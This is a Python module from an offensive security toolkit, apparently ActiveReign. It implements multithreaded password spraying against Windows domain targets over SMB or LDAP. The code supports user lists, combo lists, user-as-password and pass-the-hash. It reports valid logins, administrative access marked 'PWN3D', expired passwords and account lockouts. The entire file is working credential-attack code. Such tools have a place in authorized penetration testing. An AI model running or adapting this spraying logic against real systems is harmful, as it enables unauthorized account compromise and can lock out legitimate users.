from os import _exit
from time import sleep
from argparse import Namespace
from threading import Thread, activeCount

from ar3.core.smb import SmbCon
from ar3.logger import highlight
from ar3.core.ldap import LdapCon
from ar3.helpers.misc import get_timestamp


def main(args, config_obj, db_obj, loggers):

    for passwd in args.passwd:
        # Indicate start
        if args.hash:
            loggers['console'].info("\033[1;30mPerforming Password Spray @ {} [Users: {}] [Hash: True] [Method: {}]\033[0m".format(get_timestamp(), len(args.user), args.method))
        else:
            loggers['console'].info("\033[1;30mPerforming Password Spray @ {} [Users: {}] [Password: {}] [Method: {}]\033[0m".format(get_timestamp(),len(args.user), passwd, args.method))
        # Start
        for target in args.target:
            for user in args.user:

                # Last minute adjustments to spray values
                if args.combo:
                    user, passwd = user.split(':')
                if args.user_as_pass:
                    passwd = user.strip()
                elif args.hash:
                    passwd = ''

                # Create new namespace to pass to spray handler
                auth_args = Namespace(user         = user,
                                      passwd       = passwd,
                                      hash         = args.hash,
                                      domain       = args.domain,
                                      local_auth   = args.local_auth,
                                      debug        = args.debug,
                                      timeout      = args.timeout,
                                      method       = args.method,
                                      mode         = args.mode,
                                      user_as_pass = args.user_as_pass,
                                      jitter       = args.jitter
                                     )
                t= Thread(target=spray, args=(auth_args, loggers, db_obj, config_obj, target, user, passwd,))
                t.daemon=True
                t.start()

                while activeCount() > args.max_threads:
                    sleep(0.001)
    while activeCount() > 1:
        sleep(0.001)


def spray(auth_args, loggers, db_obj, config_obj, target, user, passwd):
    try:
        if auth_args.method.lower() == "ldap":
            con = LdapCon(auth_args, loggers, target, db_obj)
            con.create_ldap_con()

        elif auth_args.method.lower() == 'smb':
            con = SmbCon(auth_args, loggers, target, db_obj)
            con.create_smb_con()

        if auth_args.hash: passwd = auth_args.hash
        if hasattr(con, 'admin')and con.admin == True:
            loggers['console'].success([con.host, con.ip, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(con.domain, user, passwd, highlight(config_obj.PWN3D_MSG, 'yellow'))])
        else:
            loggers['console'].success([con.host, con.ip, auth_args.method.upper(),'{}\\{:<20} {:<15} {}'.format(con.domain, user, passwd, highlight("SUCCESS", "green"))])
        loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\tSuccess".format(get_timestamp(), target, auth_args.domain, user, passwd))
        con.close()

    except KeyboardInterrupt:
        print("\n[!] Key Event Detected, Closing...")
        try:
            con.close()
        except:
            pass
        _exit(0)

    except Exception as e:
        # Overwrite pwd value for output
        if auth_args.hash: passwd = auth_args.hash

        if "password has expired" in str(e).lower():
            loggers['console'].success2([con.host, con.ip, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(auth_args.domain, user, passwd, highlight("PASSWORD EXPIRED", color='yellow'))])
            loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\tPassword Expired".format(get_timestamp(), target, auth_args.domain, user, passwd))

        elif "account_locked_out" in str(e).lower():
            loggers['console'].warning([target, target, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(auth_args.domain, user, passwd, highlight("ACCOUNT LOCKED", color='red'))])
            loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\tAccount Locked".format(get_timestamp(), target, auth_args.domain, user, passwd))

        elif str(e) == "Connection to Server Failed":
            loggers['console'].verbose([target, target, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(auth_args.domain, user, passwd, highlight("CONNECTION ERROR", color='red'))])
            loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\tConnection Error".format(get_timestamp(), target, auth_args.domain, user, passwd))

        elif "status_logon_failure" in str(e).lower() or "invalidCredentials" in str(e).lower():
            loggers['console'].verbose([target, target, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(auth_args.domain, user, passwd, highlight("FAILED", color='red'))])
            loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\tLogin Failed".format(get_timestamp(), target, auth_args.domain, user, passwd))

        else:
            loggers['console'].debug([target, target, auth_args.method.upper(), '{}\\{:<20} {:<15} {}'.format(auth_args.domain, user, passwd, highlight(str(e), color='red'))])
            loggers[auth_args.mode].info("[{}]\tSpray\t{}\t{}\\{}\t{}\t{}".format(get_timestamp(), target, auth_args.domain, user, passwd, str(e)))
    sleep(auth_args.jitter)
    del auth_args